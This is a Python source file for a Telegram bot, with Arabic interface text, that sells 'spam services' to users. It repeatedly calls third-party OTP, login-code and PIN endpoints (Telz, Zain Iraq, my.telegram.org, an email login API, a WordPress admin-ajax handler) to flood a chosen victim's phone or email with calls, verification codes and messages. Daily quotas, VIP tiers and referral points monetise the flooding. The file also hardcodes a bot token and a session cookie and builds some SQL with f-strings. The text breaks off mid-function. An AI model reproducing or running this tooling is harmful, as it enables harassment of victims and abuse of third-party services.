import requests
import uuid
import time
import random
import sqlite3
import json
import base64
import hashlib
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
import asyncio
import threading
import logging
from concurrent.futures import ThreadPoolExecutor

# ========== اعدادات الأداء ==========
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.ERROR)
logger = logging.getLogger(__name__)

TOKEN = "8849926338:AAHlMkH2XQM87SuNQVbe4tAcAQ4WziIY7HQ"
PAYMENT_USERNAME = "l9irch_13x1"
OWNER_IDS = [7826514908]

MAX_WORKERS = 500

BUTTONS_STATUS = {
    "call": True,
    "spam_asia": True,
    "spam_ether": True,
    "spam_telegram": True,
    "spam_email": True,
    "referral": True
}

DEFAULT_LIMITS = {
    "call": 5,
    "spam_asia": 10,
    "spam_ether": 10,
    "spam_telegram": 5,
    "spam_email": 10
}

GREEN = "🟢"
RED = "🔴"

# ========== قاعدة البيانات ==========
db_lock = threading.RLock()
executor = ThreadPoolExecutor(max_workers=MAX_WORKERS)

sent_calls = {}
call_lock = threading.Lock()

def init_db():
    with db_lock:
        conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
        conn.execute("PRAGMA journal_mode=WAL")
        conn.execute("PRAGMA synchronous=NORMAL")
        conn.execute("PRAGMA cache_size=10000")
        c = conn.cursor()
        
        c.execute('''CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            phone TEXT,
            is_vip INTEGER DEFAULT 0,
            vip_expiry TEXT,
            join_date TEXT,
            is_admin INTEGER DEFAULT 0,
            extra_tokens INTEGER DEFAULT 0,
            extra_tokens_expiry TEXT,
            points INTEGER DEFAULT 0,
            referrer_id INTEGER DEFAULT NULL,
            referral_count INTEGER DEFAULT 0
        )''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS referral_links (
            user_id INTEGER PRIMARY KEY,
            link_code TEXT UNIQUE,
            total_clicks INTEGER DEFAULT 0,
            total_registered INTEGER DEFAULT 0
        )''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS user_daily_limits (
            user_id INTEGER,
            service TEXT,
            used_today INTEGER DEFAULT 0,
            last_reset TEXT,
            PRIMARY KEY (user_id, service)
        )''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS calls_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            phone TEXT,
            call_time TEXT,
            status TEXT,
            response TEXT
        )''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS spam_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            phone TEXT,
            service TEXT,
            count INTEGER,
            success_count INTEGER,
            fail_count INTEGER,
            spam_time TEXT,
            status TEXT
        )''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS daily_stats (
            date TEXT PRIMARY KEY,
            total_calls INTEGER DEFAULT 0,
            total_spam INTEGER DEFAULT 0,
            unique_users INTEGER DEFAULT 0
        )''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS force_channels (
            channel_id TEXT PRIMARY KEY,
            channel_username TEXT
        )''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS settings (
            key TEXT PRIMARY KEY,
            value TEXT
        )''')
        
        for service, limit in DEFAULT_LIMITS.items():
            c.execute(f"INSERT OR IGNORE INTO settings (key, value) VALUES ('limit_{service}', '{limit}')")
        c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('call_wait', '30')")
        c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('referral_points', '1')")
        
        conn.commit()
        conn.close()
        print("✅ قاعدة البيانات جاهزة")

def migrate_db():
    with db_lock:
        conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
        c = conn.cursor()
        try:
            c.execute('ALTER TABLE referral_links ADD COLUMN total_clicks INTEGER DEFAULT 0')
        except:
            pass
        try:
            c.execute('ALTER TABLE referral_links ADD COLUMN total_registered INTEGER DEFAULT 0')
        except:
            pass
        try:
            c.execute('ALTER TABLE users ADD COLUMN extra_tokens INTEGER DEFAULT 0')
        except:
            pass
        try:
            c.execute('ALTER TABLE users ADD COLUMN extra_tokens_expiry TEXT')
        except:
            pass
        try:
            c.execute('ALTER TABLE users ADD COLUMN points INTEGER DEFAULT 0')
        except:
            pass
        try:
            c.execute('ALTER TABLE users ADD COLUMN referrer_id INTEGER DEFAULT NULL')
        except:
            pass
        try:
            c.execute('ALTER TABLE users ADD COLUMN referral_count INTEGER DEFAULT 0')
        except:
            pass
        conn.commit()
        conn.close()
        print("✅ تم تحديث قاعدة البيانات")

init_db()
migrate_db()

# ========== دوال اساسية ==========
def generate_referral_code(user_id):
    code = hashlib.md5(f"{user_id}{uuid.uuid4()}{time.time()}".encode()).hexdigest()[:10]
    with db_lock:
        conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
        c = conn.cursor()
        c.execute('INSERT OR REPLACE INTO referral_links (user_id, link_code) VALUES (?, ?)', (user_id, code))
        conn.commit()
        conn.close()
    return code

def get_referral_code(user_id):
    with db_lock:
        conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
        c = conn.cursor()
        c.execute('SELECT link_code FROM referral_links WHERE user_id = ?', (user_id,))
        r = c.fetchone()
        conn.close()
    if r:
        return r[0]
    return generate_referral_code(user_id)

def get_user_points(user_id):
    with db_lock:
        conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
        c = conn.cursor()
        c.execute('SELECT points FROM users WHERE user_id = ?', (user_id,))
        r = c.fetchone()
        conn.close()
    return r[0] if r and r[0] is not None else 0

def get_referral_count(user_id):
    with db_lock:
        conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
        c = conn.cursor()
        c.execute('SELECT referral_count FROM users WHERE user_id = ?', (user_id,))
        r = c.fetchone()
        conn.close()
    return r[0] if r and r[0] is not None else 0

def get_referral_stats(user_id):
    with db_lock:
        conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
        c = conn.cursor()
        c.execute('SELECT total_clicks, total_registered FROM referral_links WHERE user_id = ?', (user_id,))
        r = c.fetchone()
        conn.close()
    if r:
        return r[0] or 0, r[1] or 0
    return 0, 0

def update_referral_click(link_code):
    with db_lock:
        conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
        c = conn.cursor()
        c.execute('UPDATE referral_links SET total_clicks = total_clicks + 1 WHERE link_code = ?', (link_code,))
        conn.commit()
        conn.close()

def update_user_points(user_id, points):
    with db_lock:
        conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
        c = conn.cursor()
        c.execute('UPDATE users SET points = points + ? WHERE user_id = ?', (points, user_id))
        conn.commit()
        conn.close()

def is_owner(user_id): 
    return user_id in OWNER_IDS

def is_admin(user_id):
    if user_id in OWNER_IDS: 
        return True
    with db_lock:
        conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
        c = conn.cursor()
        c.execute('SELECT is_admin FROM users WHERE user_id = ?', (user_id,))
        r = c.fetchone()
        conn.close()
    return r and r[0] == 1

def is_vip(user_id):
    with db_lock:
        conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
        c = conn.cursor()
        c.execute('SELECT is_vip, vip_expiry FROM users WHERE user_id = ?', (user_id,))
        r = c.fetchone()
        conn.close()
    if r and r[0] == 1:
        if r[1]:
            try:
                expiry = datetime.strptime(r[1], '%Y-%m-%d')
                if expiry >= datetime.now(): 
                    return True
            except: 
                return True
        return True
    return False

def get_extra_tokens(user_id):
    with db_lock:
        conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
        c = conn.cursor()
        c.execute('SELECT extra_tokens, extra_tokens_expiry FROM users WHERE user_id = ?', (user_id,))
        r = c.fetchone()
        conn.close()
    if r and r[0] and r[1]:
        try:
            expiry = datetime.strptime(r[1], '%Y-%m-%d %H:%M:%S')
            if expiry >= datetime.now(): 
                return r[0]
        except: 
            pass
    return 0

def get_service_limit(user_id, service):
    if is_vip(user_id): 
        return 999999
    with db_lock:
        conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
        c = conn.cursor()
        c.execute(f'SELECT value FROM settings WHERE key = "limit_{service}"')
        r = c.fetchone()
        conn.close()
    free_limit = int(r[0]) if r else DEFAULT_LIMITS.get(service, 5)
    extra = get_extra_tokens(user_id)
    return free_limit + extra

def get_used_today(user_id, service):
    with db_lock:
        conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
        c = conn.cursor()
        c.execute('SELECT used_today, last_reset FROM user_daily_limits WHERE user_id = ? AND service = ?', (user_id, service))
        r = c.fetchone()
        conn.close()
    today = datetime.now().strftime('%Y-%m-%d')
    if r and r[1] == today: 
        return r[0]
    return 0

def increment_used(user_id, service, count=1):
    today = datetime.now().strftime('%Y-%m-%d')
    with db_lock:
        conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
        c = conn.cursor()
        c.execute('''INSERT INTO user_daily_limits (user_id, service, used_today, last_reset) 
                     VALUES (?, ?, ?, ?) ON CONFLICT(user_id, service) DO UPDATE SET 
                     used_today = used_today + ?, last_reset = ?''',
                  (user_id, service, count, today, count, today))
        conn.commit()
        conn.close()

def can_use_service(user_id, service):
    used = get_used_today(user_id, service)
    limit = get_service_limit(user_id, service)
    return used < limit, limit - used

def add_call_log(user_id, phone, status, response=""):
    with db_lock:
        conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
        c = conn.cursor()
        c.execute('INSERT INTO calls_log (user_id, phone, call_time, status, response) VALUES (?, ?, ?, ?, ?)',
                 (user_id, phone, datetime.now().strftime('%Y-%m-%d %H:%M:%S'), status, str(response)[:500]))
        today = datetime.now().strftime('%Y-%m-%d')
        c.execute('UPDATE daily_stats SET total_calls = total_calls + 1 WHERE date = ?', (today,))
        if c.rowcount == 0:
            c.execute('INSERT INTO daily_stats (date, total_calls, total_spam, unique_users) VALUES (?, 1, 0, 0)', (today,))
        conn.commit()
        conn.close()

def add_spam_log(user_id, phone, service, count, success_count, fail_count, status):
    with db_lock:
        conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
        c = conn.cursor()
        c.execute('INSERT INTO spam_log (user_id, phone, service, count, success_count, fail_count, spam_time, status) VALUES (?, ?, ?, ?, ?, ?, ?, ?)',
                 (user_id, phone, service, count, success_count, fail_count, datetime.now().strftime('%Y-%m-%d %H:%M:%S'), status))
        today = datetime.now().strftime('%Y-%m-%d')
        c.execute('UPDATE daily_stats SET total_spam = total_spam + ? WHERE date = ?', (count, today))
        if c.rowcount == 0:
            c.execute('INSERT INTO daily_stats (date, total_calls, total_spam, unique_users) VALUES (?, 0, ?, 0)', (today, count))
        conn.commit()
        conn.close()

def reset_daily_limits():
    with db_lock:
        conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
        c = conn.cursor()
        today = datetime.now().strftime('%Y-%m-%d')
        c.execute('UPDATE user_daily_limits SET used_today = 0, last_reset = ? WHERE last_reset != ?', (today, today))
        conn.commit()
        conn.close()

async def check_channel(user_id, context):
    with db_lock:
        conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
        c = conn.cursor()
        c.execute('SELECT channel_username FROM force_channels')
        channels = c.fetchall()
        conn.close()
    for ch in channels:
        try:
            member = await context.bot.get_chat_member(chat_id=f"@{ch[0]}", user_id=user_id)
            if member.status in ['left', 'kicked']: 
                return False, ch[0]
        except: 
            continue
    return True, None

# ========== اتصال Telz ==========
def telz_call_real(phone):
    android_id = uuid.uuid4().hex[:16]
    uid = str(uuid.uuid4())
    
    headers = {
        "User-Agent": "Telz-Android/17.5.48",
        "Content-Type": "application/json; charset=UTF-8"
    }
    
    try:
        requests.post("https://api.telz.com/app/auth_list", json={
            "android_id": android_id, "app_version": "17.5.48", "event": "auth_list",
            "os": "android", "os_version": "15", "ts": int(time.time() * 1000), "uuid": uid
        }, headers=headers, timeout=5)
        
        requests.post("https://api.telz.com/app/run", json={
            "android_id": android_id, "app_version": "17.5.48", "device_name": "",
            "event": "run", "ipv4_address": "", "lang": "ar",
            "network_country": "iq", "network_type": "WIFI", "os": "android",
            "os_version": "15", "push_token": "", "roaming": "no", "root": "no",
            "run_id": str(int(time.time())), "sim_country": "iq",
            "ts": int(time.time() * 1000), "uuid": uid
        }, headers=headers, timeout=5)
        
        requests.post("https://api.telz.com/app/validate_phonenumber", json={
            "android_id": android_id, "app_version": "17.5.48", "event": "validate_phonenumber",
            "os": "android", "os_version": "15", "phone": phone, "region": "IQ",
            "ts": int(time.time() * 1000), "uuid": uid
        }, headers=headers, timeout=5)
        
        time.sleep(0.5)
        
        r4 = requests.post("https://api.telz.com/app/auth_call", json={
            "android_id": android_id, "app_version": "17.5.48", "attempt": "0",
            "event": "auth_call", "lang": "ar", "os": "android", "os_version": "15",
            "phone": phone, "ts": int(time.time() * 1000), "uuid": uid,
            "run_id": str(int(time.time() * 1000))
        }, headers=headers, timeout=5)
        
        result = r4.json()
        
        if result.get('status') == 'ok':
            return True, "✅ تم إرسال المكالمة بنجاح"
        elif result.get('reason') == '3.1':
            return False, "⚠️ الرقم مسجل مسبقاً"
        else:
            return False, "❌ فشل إرسال المكالمة"
            
    except Exception as e:
        return False, f"❌ خطأ: {str(e)[:30]}"

# ========== خدمات السبام ==========
def send_ether_spam_real(phone, count):
    success, failed = 0, 0
    for i in range(min(count, 50)):
        try:
            url = "https://mw-mobileapp.iq.zain.com/api/otp/request"
            payload = {"msisdn": phone}
            headers = {'User-Agent': "okhttp/4.11.0", 'Content-Type': "application/json"}
            r = requests.post(url, json=payload, headers=headers, timeout=5)
            if r.status_code in [200, 201, 202]:
                success += 1
            else:
                failed += 1
        except:
            failed += 1
        time.sleep(0.1)
    return success, failed

def send_telegram_spam_real(phone, count):
    success, failed = 0, 0
    for i in range(min(count, 30)):
        try:
            cookies = {'stel_ln': 'ar', 'stel_acid': 'FrtmvJBwZdq7sey4JzSCm0bwhg97BgwnV5sFftSz09zwfRILdgH_sEVFAIp0KIpM'}
            data = {'phone': phone}
            r = requests.post('https://my.telegram.org/auth/send_password', cookies=cookies, data=data, timeout=5)
            if '"random_hash"' in r.text:
                success += 1
            else:
                failed += 1
        except:
            failed += 1
        time.sleep(0.15)
    return success, failed

def send_gmail_spam_real(email, count):
    success, failed = 0, 0
    for i in range(min(count, 50)):
        try:
            json_data = {'email': email, 'sdk': 'web', 'platform': 'desktop'}
            r = requests.post('https://api.kidzapp.com/api/3.0/customlogin/', json=json_data, timeout=5)
            if '"EMAIL SENT"' in r.text:
                success += 1
            else:
                failed += 1
        except:
            failed += 1
        time.sleep(0.1)
    return success, failed

def send_asia_spam_real(phone, count, message):
    success, failed = 0, 0
    name = base64.b64decode('2ZjZrNmA').decode()
    for i in range(min(count, 100)):
        try:
            data = {
                'action': 'send_pin_code', 'msisdn': phone, 'appId': '3',
                'packageName': name + message, 'paymentMethodId': '3'
            }
            r = requests.post('https://pashacards.net/wp-admin/admin-ajax.php', data=data, timeout=5)
            if '"success":true' in r.text:
                success += 1
            else:
                failed += 1
        except:
            failed += 1
        time.sleep(0.1)
    return success, failed

async def make_call(phone, user_id):
    loop = asyncio.get_event_loop()
    success, message = await loop.run_in_executor(executor, telz_call_real, phone)
    add_call_log(user_id, phone, 'نجحت' if success else 'فشل', message)
    return success, message

# ========== القائمة الرئيسية ==========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user = update.effective_user
        
        args = context.args
        referrer_id = None
        if args and args[0].startswith('ref_'):
            code = args[0].replace('ref_', '')
            update_referral_click(code)
            with db_lock:
                conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
                c = conn.cursor()
                c.execute('SELECT user_id FROM referral_links WHERE link_code = ?', (code,))
                r = c.fetchone()
                if r:
                    referrer_id = r[0]
                conn.close()
        
        with db_lock:
            conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
            c = conn.cursor()
            c.execute('SELECT * FROM users WHERE user_id = ?', (user.id,))
            existing = c.fetchone()
            if not existing:
                today = datetime.now().strftime('%Y-%m-%d')
                points_to_add = 1
                if referrer_id and referrer_id != user.id:
                    c.execute("INSERT INTO users (user_id, username, first_name, join_date, points, referrer_id, referral_count) VALUES (?, ?, ?, ?, ?, ?, 0)",
                             (user.id, user.username or "None", user.first_name, today, points_to_add, referrer_id))
                    c.execute('UPDATE users SET points = points + 1, referral_count = referral_count + 1 WHERE user_id = ?', (referrer_id,))
                    c.execute('UPDATE referral_links SET total_registered = total_registered + 1 WHERE user_id = ?', (referrer_id,))
                    conn.commit()
                    try:
                        await context.bot.send_message(referrer_id, "🎁 تمت إحالة مستخدم جديد!\n💎 ربحت 1 نقطة")
                    except:
                        pass
                else:
                    c.execute("INSERT INTO users (user_id, username, first_name, join_date, points, referrer_id, referral_count) VALUES (?, ?, ?, ?, ?, ?, 0)",
                             (user.id, user.username or "None", user.first_name, today, points_to_add, None))
                
                c.execute('INSERT OR IGNORE INTO daily_stats (date, total_calls, total_spam, unique_users) VALUES (?, 0, 0, 0)', (today,))
                c.execute('UPDATE daily_stats SET unique_users = unique_users + 1 WHERE date = ?', (today,))
                
                for owner_id in OWNER_IDS:
                    try:
                        await context.bot.send_message(
                            owner_id,
                            f"👤 مستخدم جديد\n\n🆔 الايدي: {user.id}\n📛 الاسم: {user.first_name}\n🏷️ اليوزر: @{user.username if user.username else 'لا يوجد'}\n📅 التاريخ: {today}\n💎 النقاط: {points_to_add}"
                        )
                    except:
                        pass
                conn.commit()
            conn.close()
        
        ok, ch = await check_channel(user.id, context)
        if not ok:
            keyboard = [[InlineKeyboardButton("📢 اشترك بالقناة", url=f"https://t.me/{ch}")], [InlineKeyboardButton("✅ تحقق", callback_data="check_sub")]]
            await update.message.reply_text(f"⚠️ اشتراك إجباري\n\nيرجى الاشتراك في القناة:\n@{ch}", reply_markup=InlineKeyboardMarkup(keyboard))
            return
        
        await show_main_menu(update.message, user.id, context)
    except Exception as e:
        logger.error(f"Error in start: {e}")

async def show_main_menu(message, user_id, context):
    try:
        points = get_user_points(user_id)
        clicks, registered = get_referral_stats(user_id)
        
        keyboard = [
            [InlineKeyboardButton(f"🎁 تجميع نقاط", callback_data="earn_points")],
            [InlineKeyboardButton(f"ℹ️ معلومات حسابي", callback_data="my_info")],
            [InlineKeyboardButton(f"🔄 تحويل نقاط", callback_data="transfer_menu")],
            [InlineKeyboardButton(f"🛠️ خدمات البوت للسبام", callback_data="services_menu")],
            [InlineKeyboardButton(f"💰 رصيد حسابي : {points} نقطة", callback_data="show_balance")],
            [InlineKeyboardButton(f"👑 اشتراك VIP", callback_data="vip_menu")],
        ]
        
        if is_admin(user_id):
            keyboard.append([InlineKeyboardButton(f"👨‍💼 لوحة الادمن", callback_data="admin_panel")])
        if is_owner(user_id):
            keyboard.append([InlineKeyboardButton(f"⚡ لوحة المالك", callback_data="owner_panel")])
        
        await message.reply_text(
            f"✦ • ───────────────── • ✦\n"
            f"🌟 *مرحباً بك في بوت الخدمات المتكاملة* 🌟\n"
            f"✦ • ───────────────── • ✦\n\n"
            f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            f"┃ 💰 رصيدك : {points} نقطة\n"
            f"┃ ⭐ استخدم نقاطك للحصول على خدمات إضافية\n"
            f"┃ 📞 لديك محاولات مجانية يومياً\n"
            f"┃ 🔗 زوار رابطك : {clicks} | مسجل : {registered}\n"
            f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
            f"📌 *اختر ما يناسبك:*",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Error in show_main_menu: {e}")

# ========== قائمة الخدمات ==========
async def services_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        user_id = query.from_user.id
        await query.answer()
        
        points = get_user_points(user_id)
        
        call_used = get_used_today(user_id, "call")
        call_limit = get_service_limit(user_id, "call")
        call_remaining = call_limit - call_used
        
        asia_used = get_used_today(user_id, "spam_asia")
        asia_limit = get_service_limit(user_id, "spam_asia")
        asia_remaining = asia_limit - asia_used
        
        ether_used = get_used_today(user_id, "spam_ether")
        ether_limit = get_service_limit(user_id, "spam_ether")
        ether_remaining = ether_limit - ether_used
        
        tg_used = get_used_today(user_id, "spam_telegram")
        tg_limit = get_service_limit(user_id, "spam_telegram")
        tg_remaining = tg_limit - tg_used
        
        email_used = get_used_today(user_id, "spam_email")
        email_limit = get_service_limit(user_id, "spam_email")
        email_remaining = email_limit - email_used
        
        keyboard = [
            [InlineKeyboardButton(f"{GREEN if BUTTONS_STATUS['call'] else RED} 📞 اتصال (المتبقي: {call_remaining})", callback_data="call_menu")],
            [InlineKeyboardButton(f"{GREEN if BUTTONS_STATUS['spam_asia'] else RED} 🌏 سبام آسيا (المتبقي: {asia_remaining})", callback_data="spam_asia_menu")],
            [InlineKeyboardButton(f"{GREEN if BUTTONS_STATUS['spam_ether'] else RED} 🔥 سبام اثير (المتبقي: {ether_remaining})", callback_data="spam_ether_menu")],
            [InlineKeyboardButton(f"{GREEN if BUTTONS_STATUS['spam_telegram'] else RED} 📱 سبام تيليجرام (المتبقي: {tg_remaining})", callback_data="spam_telegram_menu")],
            [InlineKeyboardButton(f"{GREEN if BUTTONS_STATUS['spam_email'] else RED} ✉️ سبام جيميل (المتبقي: {email_remaining})", callback_data="spam_email_menu")],
            [InlineKeyboardButton(f"💎 استبدال نقاط (1 نقطة = محاولة إضافية)", callback_data="redeem_menu")],
            [InlineKeyboardButton(f"🔄 تحويل نقاط لخدمة", callback_data="transfer_service_menu")],
            [InlineKeyboardButton("🔙 رجوع", callback_data="back_main")]
        ]
        
        await query.edit_message_text(
            f"◈ • ───────────────── • ◈\n"
            f"🛠️ *خدمات البوت للسبام* 🛠️\n"
            f"◈ • ───────────────── • ◈\n\n"
            f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            f"┃ 💎 نقاطك : {points} نقطة\n"
            f"┃ 📞 محاولاتك المجانية اليوم :\n"
            f"┃    • اتصال: {call_used}/{call_limit}\n"
            f"┃    • سبام آسيا: {asia_used}/{asia_limit}\n"
            f"┃    • سبام اثير: {ether_used}/{ether_limit}\n"
            f"┃    • سبام تيليجرام: {tg_used}/{tg_limit}\n"
            f"┃    • سبام جيميل: {email_used}/{email_limit}\n"
            f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
            f"📌 *اختر الخدمة:*",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Error in services_menu: {e}")

# ========== باقي الدوال ==========
async def show_balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        user_id = query.from_user.id
        points = get_user_points(user_id)
        keyboard = [[InlineKeyboardButton("🔙 رجوع", callback_data="back_main")]]
        await query.edit_message_text(
            f"💰 *رصيد حسابك*\n\n"
            f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            f"┃ 💎 رصيدك : {points} نقطة\n"
            f"┃ ⭐ كل نقطة = محاولة خدمة إضافية واحدة\n"
            f"┃ 🎁 يمكنك جمع النقاط عبر دعوة الأصدقاء\n"
            f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Error in show_balance: {e}")

async def earn_points(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if not BUTTONS_STATUS.get("referral", True):
            query = update.callback_query
            await query.answer("🔴 خدمة تجميع النقاط في وضع الصيانة!", show_alert=True)
            return
        
        query = update.callback_query
        await query.answer()
        user_id = query.from_user.id
        code = get_referral_code(user_id)
        bot_username = context.bot.username
        link = f"https://t.me/{bot_username}?start=ref_{code}"
        referrals = get_referral_count(user_id)
        clicks, registered = get_referral_stats(user_id)
        
        keyboard = [
            [InlineKeyboardButton("🔗 مشاركة الرابط", url=f"https://t.me/share/url?url={link}&text=🚀 انضم لهذا البوت الرائع!")],
            [InlineKeyboardButton("🔙 رجوع", callback_data="back_main")]
        ]
        
        await query.edit_message_text(
            f"🎁 *طريقة تجميع النقاط*\n\n"
            f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            f"┃ 1️⃣ شارك رابط الدعوة الخاص بك\n"
            f"┃ 2️⃣ كل شخص يسجل عبر رابطك يمنحك 1 نقطة\n"
            f"┃ 3️⃣ استخدم النقاط للحصول على محاولات إضافية\n"
            f"┃\n"
            f"┃ 📊 إحصائيات رابطك:\n"
            f"┃    • عدد النقرات: {clicks}\n"
            f"┃    • عدد المسجلين: {registered}\n"
            f"┃    • عدد المحالين في البوت: {referrals}\n"
            f"┃\n"
            f"┃ 🔗 رابطك :\n"
            f"┃ `{link}`\n"
            f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Error in earn_points: {e}")

async def my_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        user_id = query.from_user.id
        points = get_user_points(user_id)
        referrals = get_referral_count(user_id)
        clicks, registered = get_referral_stats(user_id)
        
        with db_lock:
            conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
            c = conn.cursor()
            c.execute('SELECT join_date, first_name FROM users WHERE user_id = ?', (user_id,))
            u = c.fetchone()
            c.execute('SELECT COUNT(*) FROM calls_log WHERE user_id = ?', (user_id,))
            total_calls = c.fetchone()[0]
            c.execute('SELECT COUNT(*) FROM spam_log WHERE user_id = ?', (user_id,))
            total_spam = c.fetchone()[0]
            conn.close()
        
        status = "VIP 👑" if is_vip(user_id) else "عادي 📱"
        call_used = get_used_today(user_id, "call")
        call_limit = get_service_limit(user_id, "call")
        call_free = call_limit - get_extra_tokens(user_id)
        
        keyboard = [[InlineKeyboardButton("🔙 رجوع", callback_data="back_main")]]
        
        await query.edit_message_text(
            f"ℹ️ *معلومات حسابي*\n\n"
            f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            f"┃ 👤 الحالة : {status}\n"
            f"┃ 💎 نقاطك : {points}\n"
            f"┃ 👥 المحالين : {referrals}\n"
            f"┃ 🔗 نقرات رابطك : {clicks}\n"
            f"┃ 📝 مسجلين عبرك : {registered}\n"
            f"┃ 📞 إجمالي المكالمات : {total_calls}\n"
            f"┃ 💣 إجمالي السبام : {total_spam}\n"
            f"┃ 📅 تاريخ التسجيل : {u[0] if u else 'غير معروف'}\n"
            f"┃\n"
            f"┃ 📊 محاولاتك اليوم:\n"
            f"┃    • اتصال: {call_used}/{call_limit} (مجاني: {call_free})\n"
            f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Error in my_info: {e}")

async def transfer_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        keyboard = [
            [InlineKeyboardButton("🔄 تحويل نقاط لمستخدم", callback_data="transfer_points")],
            [InlineKeyboardButton("💎 تحويل نقاط لخدمة", callback_data="transfer_service_menu")],
            [InlineKeyboardButton("🔙 رجوع", callback_data="back_main")]
        ]
        await query.edit_message_text(
            f"🔄 *نظام تحويل النقاط*\n\n"
            f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            f"┃ 1️⃣ تحويل نقاط لمستخدم: إرسال نقاط لمستخدم آخر\n"
            f"┃ 2️⃣ تحويل نقاط لخدمة: شراء محاولات إضافية لمستخدم آخر\n"
            f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Error in transfer_menu: {e}")

async def transfer_points(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        context.user_data['transfer_step'] = 'waiting_id'
        keyboard = [[InlineKeyboardButton("🔙 رجوع", callback_data="back_main")]]
        await query.edit_message_text(
            f"🔄 *تحويل نقاط لمستخدم*\n\n"
            f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            f"┃ 1️⃣ أرسل ايدي المستخدم المراد التحويل إليه\n"
            f"┃ 2️⃣ ثم أرسل عدد النقاط\n"
            f"┃\n"
            f"┃ ⚠️ المستخدم يجب أن يوافق على التحويل\n"
            f"┃ ⚠️ لا يمكن استرداد النقاط بعد التحويل\n"
            f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
            f"📝 *أرسل ايدي المستخدم:*",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Error in transfer_points: {e}")

async def transfer_service_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        context.user_data['transfer_service'] = True
        context.user_data['transfer_step'] = 'waiting_service_id'
        keyboard = [[InlineKeyboardButton("🔙 رجوع", callback_data="transfer_menu")]]
        await query.edit_message_text(
            f"💎 *تحويل نقاط لخدمة*\n\n"
            f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            f"┃ 1️⃣ أرسل ايدي المستخدم\n"
            f"┃ 2️⃣ اختر الخدمة\n"
            f"┃ 3️⃣ أرسل عدد النقاط\n"
            f"┃\n"
